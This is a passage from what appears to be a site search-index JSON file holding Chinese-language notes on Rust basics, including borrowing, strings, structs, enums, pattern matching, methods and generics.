\u4ee5\u53ca\u5982\u4e0b\u4ee3\u7801\u4e5f\u4f1a\u7f16\u8bd1\u9519\u8bef\uff1a fn main () { let mut x = 1 ; let y = & mut x ; println! ( \"{}, {}\" , x , * y ); // cannot borrow `x` as immutable because it is also borrowed as mutable } \u56e0\u4e3a\u5728\u4f20\u5165\u5b8f\u65f6\uff0c\u5b9e\u9645\u4e0a\u5bf9 x \u8fdb\u884c\u4e86\u501f\u7528\uff0c\u56e0\u6b64\u540c\u65f6\u5b58\u5728\u4e86\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u7684\u5f15\u7528\uff0c\u5bfc\u81f4\u62a5\u9519","title":"\u5f15\u7528\u4e0e\u501f\u7528"},{"location":"cs/pl/rust/basic/#_22","text":"\u60ac\u5782\u5f15\u7528\uff08dangling references\uff09\u4e5f\u79f0\u60ac\u5782\u6307\u9488\uff0c\u610f\u601d\u662f\u6307\u9488\u6307\u5411\u7684\u503c\u88ab\u91ca\u653e\u6389\u4e86\uff0c\u5bfc\u81f4\u6307\u9488\u6307\u7684\u4f4d\u7f6e\u4e0d\u5b58\u5728\u671f\u671b\u7684\u5185\u5bb9\u3002rust \u4e0d\u4f1a\u5141\u8bb8\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\uff0c\u6bd4\u5982 fn dangle () -> & String { let s = String :: from ( \"abc\" ); & s } \u8fd9\u91cc\u8fd4\u56de\u4e86 s \u7684\u5f15\u7528\uff0c\u4f46\u662f\u5728\u51fd\u6570\u7ed3\u675f\u540e s \u79bb\u5f00\u4e86\u4f5c\u7528\u57df\uff0c\u88ab\u91ca\u653e\u6389\u4e86\uff0c\u6240\u4ee5\u8fd4\u56de\u7684\u5176\u5b9e\u662f\u60ac\u5782\u5f15\u7528\uff0crust \u7f16\u8bd1\u5668\u5c06\u4e0d\u4f1a\u901a\u8fc7","title":"\u907f\u514d\u60ac\u5782\u5f15\u7528"},{"location":"cs/pl/rust/basic/#_23","text":"","title":"\u590d\u5408\u7c7b\u578b"},{"location":"cs/pl/rust/basic/#_24","text":"&str \u4e0e String \u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u7c7b\u578b \u53ef\u4ee5\u4f7f\u7528 &s[a..b] \u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u5207\u7247\u7684\u5f15\u7528\uff0c\u5207\u7247\u4f7f\u7528\u7684\u662f\u524d\u9762\u7684 range \u7c7b\u578b\uff0c\u8bed\u6cd5\u548c python \u7684\u5207\u7247\u7c7b\u4f3c\uff0c\u540c\u6837\u53ef\u4ee5\u7701\u7565\u5934\u5c3e \u5bf9\u4e00\u4e2a String \u4f7f\u7528\u5207\u7247\u83b7\u5f97\u7684\u5f15\u7528\u7c7b\u578b\u4e5f\u662f &str \u5207\u7247\u662f\u6309\u5b57\u8282\u8fdb\u884c\u7684\uff0c\u9700\u8981\u7cbe\u786e\u5207\u5230\u5b57\u7b26\u8fb9\u754c\u3002\u4f8b\u5982\u5bf9\u4e2d\u6587\u5b57\u7b26\u4e32\u8fdb\u884c\u5207\u7247\uff0c&s[0..3] \u4f1a\u5207\u51fa\u4e00\u4e2a\u6c49\u5b57\u5b57\u7b26\uff0c\u800c &s[0..2] \u6ca1\u5207\u5b8c\u6574\u4f1a\u5bfc\u81f4 panic \u5b57\u7b26\u662f UCS-4 \u7f16\u7801\uff0c\u5b57\u7b26\u4e32\u662f UTF-8 \u7f16\u7801\uff08\u6bcf\u4e2a\u5b57\u7b26\u5b57\u8282\u6570\u4e0d\u5b9a\uff09 String \u4e0e &str \u8f6c\u6362 &str -> String String::from(\"...\") \"...\".to_string() String -> &str &s / &s[..] s.as_str() String \u64cd\u4f5c .push('a') \u8ffd\u52a0\u5b57\u7b26 / .push_str(\"...\") \u8ffd\u52a0\u5b57\u7b26\u4e32 .insert(n, 'a') \u5728\u7d22\u5f15 n \u7684\u4f4d\u7f6e\u63d2\u5165\u5b57\u7b26 / .insert(n, \"...\") \u540c\u7406\u63d2\u5165\u5b57\u7b26\u4e32 .replace(\"aaa\", \"AAA\") \u5168\u5c40\u66ff\u6362\u6240\u6709 \"aaa\" \u5230 \"AAA\"\uff0c\u8fd4\u56de\u66ff\u6362\u540e\u7684\u65b0\u5b57\u7b26\u4e32\uff0c\u539f\u5b57\u7b26\u4e32\u4e0d\u53d8 .replacen(\"aaa\", \"AAA\") \u540c\u4e0a\uff0c\u4f46\u53ea\u66ff\u6362 n \u6b21 .replace_range(a..b, \"...\") \u5c06\u7d22\u5f15 a..b \u7684\u8303\u56f4\u66ff\u6362\u4e3a\u65b0\u5b57\u7b26\u4e32 \"...\"\uff0c\u76f4\u63a5\u64cd\u4f5c\u539f\u5b57\u7b26\u4e32 .pop() \u5220\u9664\u5e76\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd4\u56de\u503c\u4e3a\u4e00\u4e2a Option\uff0c\u82e5\u5b57\u7b26\u4e32\u4e3a\u7a7a\u5219\u8fd4\u56de None .remove(n) \u5220\u9664\u4ee5\u7d22\u5f15 n \u5f00\u5934\u7684\u4e00\u4e2a\u5b57\u7b26 .truncate(n) \u5220\u9664\u7d22\u5f15 n \u5f00\u5934\u53ca\u4e4b\u540e\u7684\u6240\u6709\u5b57\u7b26 .clear() \u6e05\u7a7a\u5b57\u7b26\u4e32 \u4f7f\u7528 + \u6216 += \u8fde\u63a5\u4e00\u4e2a &str \u5b57\u7b26\u4e32\uff08\u4e0d\u80fd\u662f String\uff09 + \u8fd0\u7b97\u7b26\u5de6\u4fa7\u7684\u53d8\u91cf\u5c06\u5931\u6548\uff0c\u56e0\u4e3a\u6240\u6709\u6743\u8f6c\u79fb\u5230\u4e86 .add() \u65b9\u6cd5\u4e2d\u7136\u540e\u88ab\u91ca\u653e \u53ef\u4ee5\u4f7f\u7528 let s = format!(\"{} {}\", s1, s2) \u6765\u8fde\u63a5\u521b\u5efa\u65b0\u7684\u5b57\u7b26\u4e32 \u5b57\u7b26\u4e32\u8f6c\u4e49 \"\\x..\" \u5341\u516d\u8fdb\u5236\u8868\u793a\uff0c\u5fc5\u987b\u5728 \\x00 \u5230 \\x7f \u4e4b\u95f4 \"\\u{....}\" \u7528 codepoint \u8868\u793a\u4e00\u4e2a unicode \u5b57\u7b26 \u53ef\u4ee5\u76f4\u63a5\u6362\u884c\uff0c\u4f46\u4ece\u4e0b\u4e00\u884c\u884c\u9996\u5f00\u59cb\u5c31\u8bb0\u5f55\u6587\u672c\uff08\u4e5f\u5c31\u662f\u4e0d\u5f53\u4f5c\u7f29\u8fdb\u5ffd\u7565\uff09\uff0c\u884c\u5c3e\u52a0 \u4e0d\u6362\u884c\uff0c\u4e14\u4e0b\u4e00\u884c\u884c\u9996\u7a7a\u683c\u5ffd\u7565 \u5176\u5b83\u8f6c\u4e49\u548c\u5176\u5b83\u8bed\u8a00\u5747\u7c7b\u4f3c r\"...\" \u4e2d\u7684 \u4e0d\u53c2\u4e0e\u8f6c\u4e49\uff08\u548c python \u7c7b\u4f3c\uff09 r#\"...\"# \u4e2d\u7684\u53cc\u5f15\u53f7\u4e0d\u4f1a\u63d0\u524d\u7ed3\u675f\u5b57\u7b26\u4e32\uff08\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4e0d\u9700\u8981\u8f6c\u4e49\u53cc\u5f15\u53f7\uff09 r##\"...\"## \u4e2d\u7684 \"# \u4e5f\u4e0d\u4f1a\u63d0\u524d\u7ed3\u675f\u5b57\u7b26\u4e32\uff08\u53cc\u5f15\u53f7\u524d\u540e\u7684\u4e95\u53f7\u52a0\u591a\u5c11\u90fd\u53ef\u4ee5\uff0c\u53ea\u9700\u8981\u5339\u914d\u5373\u53ef\uff09 \u64cd\u4f5c UTF-8 \u5b57\u7b26\u4e32 \u5faa\u73af\u904d\u5386\u5b57\u7b26\u53ef\u4ee5\u4f7f\u7528 for c in \"...\" . chars () \u5faa\u73af\u904d\u5386\u5b57\u8282\u53ef\u4ee5\u4f7f\u7528 for c in \"...\" . bytes () \u5176\u5b83\u64cd\u4f5c\u6807\u51c6\u5e93\u4e2d\u6ca1\u6709\uff0c\u9700\u8981\u901a\u8fc7\u522b\u7684 crates","title":"\u5b57\u7b26\u4e32"},{"location":"cs/pl/rust/basic/#_25","text":"\u957f\u5ea6\u56fa\u5b9a\uff0c\u5143\u7d20\u987a\u5e8f\u53ca\u7c7b\u578b\u56fa\u5b9a\u7684\u590d\u5408\u7c7b\u578b\uff0c\u4f8b\u5982 let t : ( i32 , f64 ) = ( 1 , 1.1 ); \u4f7f\u7528\u6a21\u5f0f\u5339\u914d\u83b7\u53d6\u5143\u7ec4\u4e2d\u7684\u503c\uff1a let ( a , b ) = t ; \u4f7f\u7528 . \u6765\u8bbf\u95ee\u5143\u7ec4\u5185\u5bb9\uff1a t.0 == 1","title":"\u5143\u7ec4"},{"location":"cs/pl/rust/basic/#_26","text":"\u4f7f\u7528 struct \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u7ed3\u6784\u4f53\uff0c\u6307\u660e\u5b57\u6bb5\u540d\u4e0e\u7c7b\u578b\uff1a struct User { name : String , age : u32 , email : String , } \u521b\u5efa\u7ed3\u6784\u4f53\u5b9e\u4f8b\u65f6\u6bcf\u4e2a\u5b57\u6bb5\u90fd\u9700\u8981\u521d\u59cb\u5316\uff0c\u4e14\u987a\u5e8f\u53ef\u4ee5\u6253\u4e71\uff1a let user1 = User { age : 19_ u32 , name : String :: from ( \"TonyCrane\" ), email : String :: from ( \"tonycrane@foxmail.com\" ), }; \u8bbf\u95ee\u7ed3\u6784\u4f53\u5b57\u6bb5\u76f4\u63a5\u4f7f\u7528 . \u5c31\u53ef\u4ee5\u3002\u4fee\u6539\u67d0\u4e00\u5b57\u6bb5\u9700\u8981\u5c06\u6574\u4e2a\u7ed3\u6784\u4f53\u6807\u8bb0\u4e3a mut\uff0c\u65e0\u6cd5\u5c06\u67d0\u4e00\u5b57\u6bb5\u5355\u72ec\u6807\u8bb0\u4e3a mut \u53e6\u5916\uff0c\u5728\u7ed3\u6784\u4f53\u4e2d\u4f7f\u7528\u5f15\u7528\u7c7b\u578b\u9700\u8981\u7528\u5230\u751f\u547d\u5468\u671f","title":"\u7ed3\u6784\u4f53"},{"location":"cs/pl/rust/basic/#_27","text":"fn build_user ( name : String , age : u32 ) -> User { User { name , // name: name \u7f29\u5199 age , // age: age \u7f29\u5199 email : String :: from ( \"\" ), } } \u5f53\u53c2\u6570\u540d\u548c\u5b57\u6bb5\u540d\u76f8\u540c\u7684\u65f6\u5019\u53ef\u4ee5\u7701\u7565\u6389\u5185\u5bb9","title":"\u7b80\u5316\u521b\u5efa"},{"location":"cs/pl/rust/basic/#_28","text":"\u901a\u8fc7\u5df2\u6709\u7ed3\u6784\u4f53\u5b9e\u4f8b\u521b\u5efa\u65b0\u5b9e\u4f8b\uff1a let user2 = User { email : String :: from ( \"another@example.com\" ), .. user1 // \u5fc5\u987b\u5199\u5728\u540e\u9762 }; \u5c06 user1 \u9664\u4e86 email \u4e4b\u5916\u7684\u5b57\u6bb5 \u79fb\u52a8 \u5230 user2 \u4e2d\u3002\u56e0\u4e3a\u8fd9\u662f\u79fb\u52a8\uff0c\u6240\u4ee5\u53d1\u751f\u4e86\u6240\u6709\u6743\u7684\u8f6c\u79fb\uff0c\u5bfc\u81f4 user1.name \u540e\u9762\u4e0d\u80fd\u88ab\u4f7f\u7528\u3002\u4f46\u56e0\u4e3a u32 \u5b9e\u73b0\u4e86 Copy trait\uff0c\u6240\u4ee5 user1.age \u4ecd\u53ef\u4ee5\u4f7f\u7528\u3002\u5e76\u4e14 user1.email \u6240\u6709\u6743\u5e76\u6ca1\u6709\u8f6c\u79fb\uff0c\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528","title":"\u66f4\u65b0\u7ed3\u6784\u4f53"},{"location":"cs/pl/rust/basic/#_29","text":"\u53ef\u4ee5\u5b9a\u4e49\u50cf\u5143\u7ec4\u4e00\u6837\u6ca1\u6709\u5b57\u6bb5\u540d\u7684\u7ed3\u6784\u4f53\uff1a struct Point ( i32 , i32 , i32 ); let point = Point ( 0 , 0 , 0 );","title":"\u5143\u7ec4\u7ed3\u6784\u4f53"},{"location":"cs/pl/rust/basic/#_30","text":"\u50cf\u5355\u5143\u7c7b\u578b\u4e00\u6837\uff0c\u6ca1\u6709\u4efb\u4f55\u5b57\u6bb5\u548c\u5c5e\u6027\u7684\u7ed3\u6784\u4f53\u3002\u4f5c\u7528\u4e0a\u6765\u770b\u5c31\u662f\u4e0d\u5173\u5fc3\u6570\u636e\uff0c\u4f46\u5173\u5fc3\u884c\u4e3a\uff08\u540e\u9762 impl \u4e4b\u7c7b\u7684\uff09 struct UnitLikeStruct ; let a = UnitLikeStruct ;","title":"\u5355\u5143\u7ed3\u6784\u4f53"},{"location":"cs/pl/rust/basic/#_31","text":"\u7ed3\u6784\u4f53\u4e0d\u80fd\u76f4\u63a5\u88ab\u653e\u5728 {} \u4e2d\u6253\u5370\uff0c\u56e0\u4e3a\u6ca1\u6709\u5b9e\u73b0 Display trait \u4e00\u79cd\u65b9\u4fbf\u7684\u8f93\u51fa\u65b9\u5f0f\u662f\u5229\u7528 #[derive(Debug)] \u6765\u81ea\u52a8\u5b9e\u73b0 Debug trait \u6765\u5229\u7528 {:?} \u683c\u5f0f\u5316\u6216 dbg! \u5b8f\u8fdb\u884c debug \u6253\u5370\uff1a #[derive(Debug)] struct Rectangle { width : u32 , height : u32 , } fn main () { let rect = Rectangle { width : 30 , height : 50 }; println! ( \"{:?}\" , rect ); dbg! ( rect ); // \u8f93\u51fa\u5230 stderr \u6d41\u4e2d } \u8f93\u51fa\u4e3a\uff1a Rectangle { width: 30, height: 50 } [src/main.rs:10] rect = Rectangle { width: 30, height: 50, }","title":"\u6253\u5370\u7ed3\u6784\u4f53"},{"location":"cs/pl/rust/basic/#_32","text":"\u4f7f\u7528 enum \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u679a\u4e3e\u7c7b\u578b\uff0c\u7528 :: \u6765\u8bbf\u95ee\u6210\u5458\uff0c\u53ef\u4ee5\u5305\u542b\u503c\uff1a enum Message { Quit , Move { x : i32 , y : i32 }, Write ( String ), ChangeColor ( i32 , i32 , i32 ), } fn main () { let m1 = Message :: Quit ; let m2 = Message :: Move { x : 1 , y : 1 }; let m3 = Message :: ChangeColor ( 255 , 255 , 0 ); }","title":"\u679a\u4e3e"},{"location":"cs/pl/rust/basic/#option","text":"\u7c7b\u4f3c Haskell \u4e2d\u7684 Maybe\uff0c\u5b9a\u4e49\u662f\uff1a enum Option < T > { Some ( T ), None , } \u4f7f\u7528\u65f6\u65e0\u9700\u6dfb\u52a0 Option:: \u524d\u7f00\uff0c\u63d0\u53d6\u503c\u53ef\u4ee5\u4f7f\u7528\u6a21\u5f0f\u5339\u914d","title":"Option"},{"location":"cs/pl/rust/basic/#_33","text":"rust \u4e2d\u6570\u7ec4\u957f\u5ea6\u56fa\u5b9a\uff0c\u5fc5\u987b\u6709\u76f8\u540c\u7c7b\u578b\uff0c\u5b58\u50a8\u7ebf\u6027\u6392\u5217\u5728\u6808\u4e0a\uff0c\u901f\u5ea6\u5feb \u4e00\u4e2a\u6570\u7ec4\u7684\u7c7b\u578b\u662f [ \u5143\u7d20\u7c7b\u578b ; \u5143\u7d20\u4e2a\u6570 ]\uff0c\u4f8b\u5982 [ i32 ; 5 ] \u8868\u793a\u5305\u542b 5 \u4e2a i32 \u7684\u6570\u7ec4 \u4f7f\u7528\u540c\u4e00\u4e2a\u91cd\u590d\u5143\u7d20\u521d\u59cb\u5316\u6570\u7ec4\uff0c\u4f8b let a = [ 3 ; 5 ] \u5373 a \u4e3a\u5305\u542b 5 \u4e2a 3 \u7684\u6570\u7ec4 \u7d22\u5f15\u4f7f\u7528 []\uff0c\u4e0e\u5176\u5b83\u8bed\u8a00\u76f8\u540c \u8d8a\u754c\u8bbf\u95ee\u4f1a\u89e6\u53d1 panic \u548c\u5b57\u7b26\u4e32\u4e00\u6837\u53ef\u4ee5\u521b\u5efa\u5207\u7247\u5f15\u7528","title":"\u6570\u7ec4"},{"location":"cs/pl/rust/basic/#_34","text":"","title":"\u6d41\u7a0b\u63a7\u5236"},{"location":"cs/pl/rust/basic/#_35","text":"if - else if - else \u7ed3\u6784 \u6761\u4ef6\u4e0d\u9700\u8981\u52a0\u62ec\u53f7 if \u8bed\u53e5\u5757\u662f\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u7528\u6765\u8d4b\u503c","title":"\u5206\u652f"},{"location":"cs/pl/rust/basic/#_36","text":"for \u5faa\u73af for ... in ... \u7ed3\u6784 in \u540e\u9762\u7684\u96c6\u5408\u4e00\u822c\u9700\u8981\u4f7f\u7528\u5f15\u7528\uff0c\u5426\u5219\u4f1a\u5c06\u6240\u6709\u6743\u79fb\u81f3 for \u5757\u5185\uff08\u5b9e\u73b0\u4e86 Copy trait \u7684\u9664\u5916\uff09 \u5faa\u73af\u4e2d\u4fee\u6539\u5143\u7d20\u7684\u8bdd\u4e00\u822c\u9700\u8981\u4f7f\u7528\u53ef\u53d8\u5f15\u7528 \u5e26\u7d22\u5f15\u5faa\u73af let a = [ 4 , 3 , 2 , 1 ]; for ( i , v ) in a . iter (). enumerate () { // ... } \u4ec5\u5faa\u73af\u591a\u5c11\u6b21\uff1a for _ in 0 .. 10 \u5faa\u73af 10 \u6b21 \u53ef\u4ee5\u4f7f\u7528 continue \u548c break \u63a7\u5236\u5faa\u73af while \u5faa\u73af \u6ca1\u4ec0\u4e48\u7279\u522b\u7684 loop \u5faa\u73af \u4e0d\u4f1a\u81ea\u52a8\u505c\u6b62\uff0c\u9700\u8981\u9760 break \u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u53ef\u4ee5\u5229\u7528 break \u6765\u8fd4\u56de\u4e00\u4e2a\u503c let result = loop { cnt += 1 ; if cnt == 10 { break cnt * 2 ; } }; rust \u4e2d\u53ef\u4ee5\u4f7f\u7528 label \u6765\u6307\u5b9a\u591a\u91cd\u5faa\u73af\u4e2d break \u6216 continue \u54ea\u4e00\u5c42\u5faa\u73af\uff1a ' outer : for i in 0 .. 10 { println! ( \"Outer: #i = {}\" , i ); ' inner : for j in 0 .. 10 { println! ( \"Inner: #j = {}\" , j ); if j == i { continue 'outer ; } if i == 5 { break 'outer ; } if j != 0 { continue 'inner ; } println! ( \"...\" ); } }","title":"\u5faa\u73af"},{"location":"cs/pl/rust/basic/#_37","text":"rust \u4e2d\u6709\u5f88\u591a\u6a21\u5f0f\u5339\u914d\uff0c\u6bd4\u5982 let \u8bed\u53e5\u3001for \u5faa\u73af\u672c\u8eab\u5c31\u76f8\u5f53\u4e8e\u6a21\u5f0f\u5339\u914d\uff1a let ( x , y ) = ( 1 , 2 ); for ( index , value ) in v . iter (). enumerate () { /* ... */ } \u4ee5\u53ca\u51fd\u6570\u53c2\u6570\uff1a fn func ( & ( x , y ) : & ( i32 , i32 )) { // x \u548c y \u4f1a\u4ece\u8fd9\u4e00\u4e2a\u53c2\u6570\u4e2d\u5339\u914d\u51fa\u6765 } \u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u4e00\u4e9b\u4e13\u95e8\u5229\u7528\u6a21\u5f0f\u5339\u914d\u7684\u8bed\u6cd5\uff1a","title":"\u6a21\u5f0f\u5339\u914d"},{"location":"cs/pl/rust/basic/#match","text":"\u7c7b\u4f3c python \u7684 match-case \u8bed\u53e5\uff0c\u4ee5\u53ca Haskell \u7684\u6a21\u5f0f\u5339\u914d\u4ee5\u53ca\u5b88\u536b\u8bed\u6cd5 match target { pattern1 => expression1 , pattern2 => { statements1 ; statements2 ; expression2 }, pattern3 | pattern4 => expression3 , _ => expression4 , } \u6574\u4e2a match \u8bed\u53e5\u5757\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f match \u5fc5\u987b\u7a77\u4e3e\u51fa\u6240\u6709\u6a21\u5f0f\uff0c\u672a\u5217\u51fa\u7684\u5269\u4f59\u90e8\u5206\u4f7f\u7528\u901a\u914d\u7b26 _ \u8868\u793a\u5176\u5b83\u6240\u6709\u53ef\u80fd\u6027 _ \u4e0d\u4f1a\u88ab\u7ed1\u5b9a\uff0c\u53ef\u4ee5\u591a\u6b21\u4f7f\u7528\uff0c\u5176\u5339\u914d\u5230\u7684\u503c\u90fd\u4f1a\u88ab\u5ffd\u7565 match \u7684\u6bcf\u4e00\u4e2a\u5206\u652f\u90fd\u5fc5\u987b\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u4e14\u6240\u6709\u5206\u652f\u7684\u8868\u8fbe\u5f0f\u8fd4\u56de\u503c\u7c7b\u578b\u9700\u8981\u76f8\u540c | \u8868\u793a\u6216\uff0c\u5373\u5339\u914d\u4e8c\u8005\u4e2d\u7684\u4e00\u4e2a\u5373\u53ef \u53ef\u4ee5\u5229\u7528\u6a21\u5f0f\u5339\u914d\u6765\u7ed1\u5b9a\u65b0\u53d8\u91cf \u5e8f\u5217\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u6a21\u5f0f\uff0c\u6bd4\u5982 x = 5 \u5c31\u53ef\u4ee5\u5339\u914d\u6a21\u5f0f 1..=5 \u53ef\u4ee5\u4f7f\u7528 .. \u6765\u5ffd\u7565\u5269\u4f59\u503c let origin = Point { x : 0 , y : 0 , z : 0 }; match origin { Point { x , .. } => println! ( \"x is {}\" , x ), } let numbers = ( 2 , 4 , 8 , 16 , 32 ); match numbers { ( first , .. , last ) => println! ( \"Some numbers: {}, {}\" , first , last ), } \u53ef\u4ee5\u5728\u6a21\u5f0f\u540e\u9762\u589e\u52a0\u989d\u5916\u7684 if \u6761\u4ef6\uff0c\u79f0\u4e3a\u5339\u914d\u5b88\u536b\uff08match guard\uff09 let num = Some ( 4 ); match num { Some ( x ) if x >= 0 & x < 5 => println! ( \"less than five: {}\" , x ), Some ( x ) => println! ( \"{}\" , x ), None => (), } \u5728\u6709 | \u7684\u60c5\u51b5\u4e0b\uff0cif \u8bed\u53e5\u7684\u6761\u4ef6\u4f1a\u4f5c\u7528\u4e8e\u6240\u6709\u7684\u6a21\u5f0f\uff0c\u800c\u4e0d\u662f\u6700\u540e\u4e00\u4e2a \u53ef\u4ee5\u4f7f\u7528 @ \u6765\u4e3a\u5b57\u6bb5\u7ed1\u5b9a\u53d8\u91cf\uff0c\u6bd4\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\u91cc\u7b2c\u4e00\u4e2a\u5339\u914d\u53ef\u4ee5\u5199\u4e3a Some ( x @ 0 .. 5 ) Rust 1.53 \u65b0\u8bed\u6cd5\uff1a\u5982 num @ ( 1 | 2 ) => .. . \u5c06 1 \u6216 2 \u7ed1\u5b9a\u5230 num \u53d8\u91cf\u4e0a Rust 1.56 \u65b0\u8bed\u6cd5\uff1a\u548c Haskell \u4e2d @ \u7528\u6cd5\u7c7b\u4f3c\uff0c\u5728\u89e3\u6784\u7684\u540c\u65f6\u4fdd\u7559\u539f\u503c\uff0c\u5982 let p @ Point { x : px , y : py } = Point { x : 10 , y : 20 }; // p = Point {x: 10, y: 20}, px = 10, py = 20","title":"match \u8bed\u53e5"},{"location":"cs/pl/rust/basic/#if-let-while-let","text":"\u53ea\u9700\u8981\u5339\u914d\u4e00\u4e2a\u6a21\u5f0f\u3001\u5ffd\u7565\u5176\u5b83\u6a21\u5f0f\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 if let \u8bed\u53e5\u6765\u7b80\u5316\uff0c\u6bd4\u5982\u4e0b\u9762\u4ee3\u7801 let v = Some ( 1 ); match v { Some ( 1 ) => println! ( \"!\" ), _ => (), } \u53ef\u4ee5\u5199\u4e3a let v = Some ( 1 ); if let Some ( 1 ) = v { // \u662f\u4e00\u4e2a\u7b49\u53f7\uff0c\u4e0d\u662f\u53cc\u7b49\u53f7 println! ( \"!\" ); } \u4e0e\u4e4b\u76f8\u4f3c\u7684\u662f while let \u8bed\u53e5\uff0c\u53ea\u8981\u5339\u914d\u5c31\u4e00\u76f4\u8fdb\u884c\u5faa\u73af\uff0c\u4f8b\u5982\uff1a let mut stack = Vec :: new (); // ... while let Some ( top ) = stack . pop () { println! ( \"pop {}\" , top ); }","title":"if let / while let"},{"location":"cs/pl/rust/basic/#matches","text":"\u4ec5\u4ec5\u9700\u8981\u5224\u65ad\u4e00\u4e2a\u503c\u662f\u5426\u548c\u4e00\u4e2a\u6a21\u5f0f\u5339\u914d\u7684\u8bdd\u53ef\u4ee5\u4f7f\u7528 matches! \u5b8f\uff1a matches! ( value , pattern ) \u5982\u679c\u5339\u914d\u5219\u8fd4\u56de true\uff0c\u5426\u5219\u8fd4\u56de false","title":"matches! \u5b8f"},{"location":"cs/pl/rust/basic/#_38","text":"Rust \u4e2d\u4f7f\u7528 impl \u5757\u6765\u4e3a\u7ed3\u6784\u4f53\u5b9a\u4e49\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5f53\u4f5c\uff0cstruct \u5b9a\u4e49\u201c\u7c7b\u201d\u7684\u5c5e\u6027\uff0cimpl \u5757\u4e2d\u5b9a\u4e49\u201c\u7c7b\u201d\u7684\u65b9\u6cd5 impl StructName { fn new ( .. .) -> StructName { StructName { .. . } } fn method ( & self , .. .) -> .. . { .. . } } \u4e00\u4e2a\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a self \u7b49\uff0c\u8868\u793a\u81ea\u8eab\uff0c\u4e14\u670d\u4ece\u6240\u6709\u6743\u89c4\u5219 self\uff1a\u5c06\u8c03\u7528\u8005\u7684\u6240\u6709\u6743\u8f6c\u79fb\u5230\u65b9\u6cd5\u4e2d\uff0c\u5c11\u7528\uff08\u7c7b\u578b\u4e3a Self \uff0c\u8868\u793a\u7ed3\u6784\u4f53\u81ea\u8eab\u7c7b\u578b\uff09 &self\uff1a\u5728\u65b9\u6cd5\u4e2d\u4f7f\u7528\u8c03\u7528\u8005\u7684\u4e0d\u53ef\u53d8\u501f\u7528\uff0c\u5e38\u7528\uff08\u5b9e\u9645\u4e0a\u662f self : & Self \u7684\u8bed\u6cd5\u7cd6\uff09 &mut self\uff1a\u5728\u65b9\u6cd5\u4e2d\u4f7f\u7528\u8c03\u7528\u8005\u7684\u53ef\u53d8\u501f\u7528\uff0c\u5e38\u7528 \u65b9\u6cd5\u540d\u53ef\u4ee5\u4e0e\u5b57\u6bb5\u540d\u76f8\u540c\uff08\u4e00\u822c\u7528\u6765\u5b9e\u73b0 getter\uff09 rust \u4f1a\u4e3a &self \u7b49\u81ea\u52a8\u5f15\u7528\u4e0e\u89e3\u5f15\u7528 impl \u5757\u4e2d\u6ca1\u6709 self \u53c2\u6570\u7684\u51fd\u6570\u79f0\u4e3a\u5173\u8054\u51fd\u6570\uff08\u5982\u4e0a\u9762\u7684 new\uff09 \u4e0d\u80fd\u4f7f\u7528 . \u6765\u4ee5\u65b9\u6cd5\u7684\u5f62\u5f0f\u8c03\u7528 \u5e94\u8be5\u4f7f\u7528 :: \u6765\u8c03\u7528\uff08\u76f8\u5f53\u4e8e\u8c03\u7528\u8fd9\u4e2a\u7ed3\u6784\u4f53\u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u51fd\u6570\uff09 new \u4e00\u822c\u7528\u6765\u4f5c\u4e3a\u6784\u9020\u5668\uff0c\u5373\u4ece\u53c2\u6570\u8fd4\u56de\u4e00\u4e2a\u7ed3\u6784\u4f53 \u53ef\u4ee5\u5728\u591a\u4e2a impl \u5757\u4e2d\u4e3a\u540c\u4e00\u4e2a\u7ed3\u6784\u4f53\u5b9a\u4e49\u65b9\u6cd5 impl \u4e5f\u53ef\u4ee5\u4e3a\u679a\u4e3e\u7c7b\u578b\u5b9a\u4e49\u65b9\u6cd5","title":"\u65b9\u6cd5"},{"location":"cs/pl/rust/basic/#generics","text":"fn add < T : std :: ops :: Add < Output = T >> ( a : T , b : T ) -> T { a + b // ^ \u4fdd\u8bc1\u53ef\u4ee5 T \u76f8\u52a0\u5e76\u5f97\u5230 T \u7c7b\u578b\u7684\u7ed3\u679c } < T > \u4e3a\u4e00\u4e2a\u51fd\u6570\u89c4\u5b9a\u4e00\u4e2a\u6cdb\u578b T\uff0c\u5192\u53f7\u540e\u9762\u63a5\u9700\u8981\u7684 trait \u6765\u6dfb\u52a0\u9650\u5236 \u53ef\u4ee5\u901a\u8bc6\u5b9a\u4e49\u591a\u4e2a\u6cdb\u578b\uff0c\u7528\u9017\u53f7\u9694\u5f00\u5373\u53ef \u7ed3\u6784\u4f53\u3001\u679a\u4e3e\u7b49\u90fd\u53ef\u4ee5\u4f7f\u7528\u6cdb\u578b struct Point < T > { x : T , y : T , } impl < T > Point < T > { //... \u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528 T } enum Option < T > { Some ( T ), None , } \u53ef\u4ee5\u4e3a\u5e26\u6cdb\u578b\u7684\u7ed3\u6784\u4f53\u9488\u5bf9\u67d0\u4e00\u5177\u4f53\u7c7b\u578b\u5b9e\u73b0\u65b9\u6cd5\uff1a impl Point < f32 > { // only for Point<f32> } \u8c03\u7528\u6cdb\u578b\u51fd\u6570 struct SGen < T > ( T ); fn func < T > ( arg : SGen < T > ) { /* ... */ } fn main () { func ( SGen ( 'a' )); // \u9690\u5f0f\u6307\u5b9a\u7c7b\u578b\u53c2\u6570 T \u4e3a char func :: < char > ( SGen ( 'a' )); // \u663e\u5f0f\u6307\u5b9a\u7c7b\u578b\u53c2\u6570 T \u4e3a char } const \u6cdb\u578b\uff0c\u5b9a\u4e49\u4e00\u4e2a\u57fa\u4e8e\u503c\u7684\u6cdb\u578b\u53c2\u6570 fn func < T : .. ., const N : usize > ( arr : [ 